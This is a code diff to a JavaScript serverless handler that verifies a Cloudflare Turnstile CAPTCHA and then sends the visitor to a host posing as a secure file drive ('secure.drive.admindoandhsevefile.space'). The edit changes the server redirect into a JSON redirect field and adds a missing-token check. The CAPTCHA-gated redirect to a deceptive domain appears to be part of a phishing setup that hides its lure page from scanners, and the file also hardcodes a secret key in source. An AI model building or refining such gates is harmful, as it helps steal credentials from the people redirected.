@@ -1,10 +1,14 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).send('Method Not Allowed');
+    return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
   const token = req.body['cf-turnstile-response'];
-  const secret = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA'; // Replace with your actual Cloudflare secret key
+  const secret = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA'; // Replace this with your Cloudflare Turnstile secret key
+
+  if (!token) {
+    return res.status(400).json({ error: 'Missing CAPTCHA token' });
+  }
 
   const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     method: 'POST',
@@ -15,10 +19,9 @@ export default async function handler(req, res) {
   const data = await verifyRes.json();
 
   if (data.success) {
-    // 🔁 This is how we trigger a redirect from server
-    res.writeHead(302, { Location: 'https://secure.drive.admindoandhsevefile.space/hKYUcWCu' });
-    res.end();
+    // ✅ Send a redirect URL in the JSON response
+    return res.status(200).json({ redirect: 'https://secure.drive.admindoandhsevefile.space/hKYUcWCu' });
   } else {
-    res.status(401).json({ error: 'Captcha verification failed' });
+    return res.status(401).json({ error: 'CAPTCHA verification failed', details: data });
   }
 }
